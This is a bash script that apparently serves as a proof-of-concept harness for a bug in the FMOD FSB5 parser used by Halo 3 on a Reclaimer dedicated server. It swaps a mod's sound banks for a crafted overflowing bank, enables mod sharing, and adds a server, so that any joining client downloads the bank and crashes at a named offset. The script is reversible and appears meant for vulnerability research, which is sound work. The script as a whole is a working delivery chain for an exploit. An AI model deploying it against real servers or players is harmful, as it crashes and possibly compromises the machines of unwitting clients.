#!/bin/bash
# Server->client served-FSB E2E setup for Halo 3 (Reclaimer dedicated server).
# Reuses the PROVEN hugeass mod (client already downloads + FMOD-loads its sfx.*.fsb
# banks, per poc-hugegrass/server.log) and swaps those banks' CONTENT for a crafted
# FSB5 bank (numSamples*4 overflow). A joining client downloads the mod via
# share_mods and faults in FMOD at halo3.dll+0x4e93e8 when it loads a crafted bank.
#
#   bash fsb_served_setup.sh install   # back up + swap crafted banks, enable share_mods
#   bash fsb_served_setup.sh clean     # restore original banks + revert config
#
# REVERSIBLE: every swapped bank is backed up to <name>.FSBBAK; `clean` restores them.
#
# The crafted bank is the bundled 68-byte PoC (../poc_v2_numsamples_oob.fsb). The
# crash is driven entirely by the FSB5 HEADER, so a 68-byte bank crashes the parser
# exactly as a full-size one would. Override with CRAFT=/path/to/bank.fsb for a
# realistically-sized bank (e.g. the craft.py output zero-padded).
set -u
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PFX="$HOME/Library/Application Support/ReclaimerMac/prefix/drive_c"
RS="$PFX/ReclaimerTestServer"
MODPC="$RS/content/Mods/Workshop/2984061723/halo3/fmod/pc"
TOML="$RS/dedicated.toml"
CRAFT="${CRAFT:-$HERE/../poc_v2_numsamples_oob.fsb}"
# banks the client was observed loading from this mod (poc-hugegrass/server.log):
BANKS=(sfx.corvette_glassing_beam.fsb sfx.super_mantis_landing.fsb sfx.super_mantis_boost2.fsb sfx.super_mantis_closing.fsb)

[ -d "$MODPC" ] || { echo "hugeass mod not found at $MODPC — is the mod installed on the server?"; exit 1; }

case "${1:-}" in
install)
  [ -f "$CRAFT" ] || { echo "crafted bank missing: $CRAFT (build it with ../../craft.py or set CRAFT=...)"; exit 1; }
  for b in "${BANKS[@]}"; do
    f="$MODPC/$b"
    [ -f "$f" ] || { echo "skip (absent): $b"; continue; }
    [ -e "$f.FSBBAK" ] || cp "$f" "$f.FSBBAK"     # back up original once
    cp "$CRAFT" "$f"                               # swap in crafted (keep the real name)
    echo "[swap] $b -> crafted ($(stat -f%z "$f")B); original at $b.FSBBAK"
  done
  # enable share_mods + add a server that PLAYS this mod (so joining clients must get it)
  [ -e "$TOML.FSBBAK" ] || cp "$TOML" "$TOML.FSBBAK"
  sed -i '' 's/^share_mods = false/share_mods = true/' "$TOML" 2>/dev/null
  echo "[cfg] share_mods -> true (backup dedicated.toml.FSBBAK)"
  if ! grep -q 'name = "FSB PoC"' "$TOML"; then
    cat >> "$TOML" <<'TOMLBLOCK'

# --- FSB PoC server (added by fsb_served_setup.sh; removed by `clean`) ---
[[server]]
name = "FSB PoC"
port = 49191
base_map = "workshop:2984061723/hugeass_remastered_mcc"
game = "Slayer"
share_mods = true
TOMLBLOCK
    echo "[cfg] appended [[server]] 'FSB PoC' on UDP 49191 (plays the hugeass mod, share_mods=true)"
  fi
  cat <<'EOF'

=== RUN IT ===
1) Start the dedicated server (serves the mod with the crafted banks):
     bash ~/Desktop/HaloReclaimerMac/shim/dedicated.sh
   (first run creates the server; check: bash ~/Desktop/HaloReclaimerMac/shim/dedicated.sh status)

2) Join the FSB PoC server from a CLEAN client (separate profile/prefix, empty
   downloaded-mods, so the crafted bank can ONLY arrive over the wire), auto-
   downloading its mod, with FMOD guard pages on:
     PELOAD_AUTO_MODS=1 PELOAD_ALLOC_GUARD=1 RECLAIMER_JOIN=127.0.0.1:49191 \
       bash ~/Desktop/HaloReclaimerMac/shim/play.sh

3) Watch the client crash when FMOD loads a crafted bank:
     grep -nE "0x4e93e8|0x4e92e0|c0000005|CRASH|FAULT|sound bank|\.fsb" /tmp/reach_play.log /tmp/reclaimer_*.log
   Expected: FAULT 0xc0000005 at halo3.dll+0x4e93e8 (the FMOD FSB5 builder OOB).

When done:  bash ~/Desktop/HaloReclaimerMac/shim/dedicated.sh stop ; bash fsb_served_setup.sh clean
EOF
  ;;
clean)
  for b in "${BANKS[@]}"; do
    f="$MODPC/$b"
    [ -e "$f.FSBBAK" ] && { mv -f "$f.FSBBAK" "$f"; echo "[restore] $b"; }
  done
  [ -e "$TOML.FSBBAK" ] && { mv -f "$TOML.FSBBAK" "$TOML"; echo "[restore] dedicated.toml"; }
  echo "clean done"
  ;;
*) echo "usage: bash fsb_served_setup.sh [install|clean]"; exit 1;;
esac
